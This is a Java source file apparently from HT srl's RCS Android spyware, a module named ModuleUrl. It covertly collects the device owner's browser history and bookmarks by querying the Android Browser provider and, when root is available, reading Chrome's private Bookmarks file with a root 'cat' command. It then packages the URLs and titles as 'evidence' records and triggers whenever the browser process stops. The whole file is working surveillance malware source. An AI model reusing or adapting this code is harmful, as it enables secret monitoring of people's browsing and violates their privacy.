/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.database.Cursor;
import android.provider.Browser;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.evidence.Markup;
import com.android.dvci.interfaces.IncrementalLog;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

import java.util.ArrayList;
import java.util.Date;
import java.util.Dictionary;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.ExecutionException;

import javax.xml.parsers.DocumentBuilderFactory;


public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {

	private static final String TAG = "ModuleUrl"; //$NON-NLS-1$

	int VERSION_DELIMITER = 0x20100713;
	private Markup markupUrl;
	//private long lastTimestamp;

	@Override
	public void actualStart() {
		markupUrl = new Markup(this);

		saveUrls(true, true);
		ListenerProcess.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerProcess.self().detach(this);
	}

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(20000);
		return true;
	}

	@Override
	public void actualGo() {

	}

	private synchronized long saveUrlsBrowser(Hashtable<String, Bookmark> bs, long lastTimestamp) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveUrlsBrowser), timestamp: " + lastTimestamp);
		}
		
		long maxTimestamp = lastTimestamp;
		try {
			String[] proj = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE};
			String sel = Browser.BookmarkColumns.DATE + " > " + lastTimestamp;
			//String sel = null;
			Cursor mCur = Status.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
			mCur.moveToFirst();

			if (mCur.moveToFirst() && mCur.getCount() > 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveUrls), records: " + mCur.getCount());
				}
				while (mCur.isAfterLast() == false) {
					try {
						String title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
						String url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
						boolean bookmark = mCur.getInt(mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK)) == 1; // 0 = history, 1 = bookmark
						long timestamp = mCur.getLong(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
						maxTimestamp = Math.max(timestamp, maxTimestamp);

						//saveEvidence(8, url, title, bookmark, new Date(timestamp));
						bs.put(url, new Bookmark(8, url, title, true, new Date()));
					}catch (Exception ex){
						if (Cfg.DEBUG){
							Check.log(TAG + " (saveUrlsBrowser), ERROR: " + ex);
						}
					}
					mCur.moveToNext();
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveUrls), ERROR", ex);
			}
		}

		return maxTimestamp;

	}

	private synchronized long saveUrlsChrome(Hashtable<String, Bookmark> bs, long lastTimestamp) {

		///data/data/com.android.chrome/app_chrome/Default/Bookmarks
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveUrlsChrome), timestamp: " + lastTimestamp);
		}

		long maxtimestamp = lastTimestamp;

		try {
			if (Status.haveRoot()) {
				ExecuteResult res = Execute.executeRoot("cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks");
				String js = res.getStdout();
				try {
					JSONObject obj = new JSONObject(js);
					JSONObject r = obj.getJSONObject("roots");

					maxtimestamp = saveChildren(bs, "bookmark_bar", lastTimestamp, maxtimestamp, r);
					maxtimestamp = saveChildren(bs, "synced", lastTimestamp, maxtimestamp, r);
					maxtimestamp = saveChildren(bs, "other", lastTimestamp, maxtimestamp, r);

				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (openBBMChatEnc), ERROR", e);
					}
				}
			}
		}catch(Exception ex){
			if (Cfg.DEBUG){
				Check.log(TAG + " (saveUrlsChrome), ERROR: " + ex);
			}
		}

		return maxtimestamp;
	}

	class Bookmark {
		int app;
		String url;
		String title;
		boolean bookmark;
		Date timestamp = new Date();

		public Bookmark(int app, String url, String title, boolean bookmark, Date timestamp){
			this.app = app;
			this.url= url;
			this.title = title;
			this.bookmark = bookmark;
			this.timestamp = timestamp;
		}
	}

	private long saveChildren(Hashtable<String, Bookmark> bs, String token, long lastTimestamp, long maxt, JSONObject r) throws JSONException {
		long maxtimestamp = maxt;
		JSONObject b = r.getJSONObject(token);
		JSONArray c = b.getJSONArray("children");

		for(int i=0; i< c.length(); i++){
			JSONObject u = c.getJSONObject(i);

			long timestamp = u.getLong("date_added");

			if(timestamp > lastTimestamp) {
				String url = u.getString("url");
				String title = u.getString("name");

				bs.put(url, new Bookmark(5, url, title, true, new Date()));
				maxtimestamp = Math.max(timestamp, maxtimestamp);
			}
		}



		return maxtimestamp;
	}

	private void saveEvidence(int browser_type,  String url, String title, boolean bookmark, Date date) {

		//BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari', 'Browser', 'Web']
		//int BROWSER_TYPE = 8;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence), browser: " + browser_type + " title: " + title + " url: " + url + " bookmark: " + bookmark + " date: " + date);
		}

		final byte[] b_tm = (new DateTime(date)).getStructTm();
		final byte[] b_url = WChar.getBytes(url.toString(), true);
		final byte[] b_title = WChar.getBytes(title, true); //$NON-NLS-1$
		//final byte[] b_window = WChar.getBytes("", true); //$NON-NLS-1$
		final ArrayList<byte[]> items = new ArrayList<byte[]>();

		EvidenceBuilder evidence;

		synchronized (this) {
			evidence = new EvidenceBuilder(EvidenceType.URL);
		}

		items.add(b_tm);
		items.add(ByteArray.intToByteArray(VERSION_DELIMITER));
		items.add(b_url);
		items.add(ByteArray.intToByteArray(browser_type));
		items.add(b_title);
		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
		}

		synchronized (this) {
			evidence.write(items);
			evidence.close();
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}

		// Do nothing, this log is not incremental anymore
	}

	void saveUrls(boolean browser, boolean chrome) {
		if (Cfg.DEBUG){
			Check.log(TAG + " (saveUrls)");
		}
		long lastTimestamp = markupUrl.unserialize(new Long(-1));
		long m1 = 0, m2 = 0;
		Hashtable<String, Bookmark> bs = new Hashtable<String,Bookmark>();

		if (browser) {
			m1 = saveUrlsBrowser(bs, lastTimestamp);
		}
		if (chrome) {
			m2 = saveUrlsChrome(bs, lastTimestamp);
		}

		for(Bookmark bm: bs.values()){
			saveEvidence(bm.app, bm.url, bm.title, bm.bookmark, bm.timestamp);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveUrls), save timestamp: " + (Math.max(m1, m2) > lastTimestamp));
		}
		markupUrl.serialize(Math.max(m1, m2));
	}

	@Override
	public int notification(ProcessInfo info) {
		if (info.status == ProcessStatus.STOP) {

			boolean browser = info.processInfo.contains("browser");
			boolean chrome = info.processInfo.contains("chrome");
			if (browser || chrome) {
				saveUrls(browser, chrome);
			}
		}

		return 0;
	}
}
